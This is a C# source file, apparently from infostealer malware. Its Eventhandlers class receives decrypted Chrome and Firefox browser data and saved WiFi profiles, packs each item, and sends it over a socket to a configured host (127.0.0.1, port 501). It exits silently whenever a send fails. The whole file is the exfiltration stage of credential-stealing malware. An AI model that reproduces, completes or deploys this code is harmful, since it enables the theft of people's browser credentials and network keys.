using System;
using System.Collections.Generic;
using ChromeDecrypt;
using FirefoxDecrypt.Models;
using PS03.Transmit;
using WiPS.Modles;

namespace PS03
{
    public class Eventhandlers
    {
        private readonly ChromePacker cpack = new ChromePacker();
        private readonly WifiPacker wpack = new WifiPacker();
        private readonly FirefoxPakcer fpack = new FirefoxPakcer();

        public RTransLink rtl = new RTransLink("127.0.0.1", 501);

        public void HandleWiFiProfileReady(List<Profile> profiles)
        {
            foreach (var profile in profiles)
            {
                try
                {
                    rtl.Send(wpack.Pack(profile));
                }
                catch (Exception)
                {
                    Environment.Exit(0);
                }
            }
        }

        public void HandleChromeDataReady(List<CPProfile> profiles)
        {
            foreach (var profile in profiles)
            {
                try
                {
                    rtl.Send(cpack.Pack(profile));
                }
                catch (Exception)
                {
                    Environment.Exit(0);
                }
            }
        }


        public void HandleFirefoxDataReady(List<FFData> profiles)
        {
            foreach(var profile in profiles)
            {
                try
                {
                    rtl.Send(fpack.Pack(profile));
                }
                catch (Exception)
                {
                    Environment.Exit(0);
                }
            }
        }
    }
}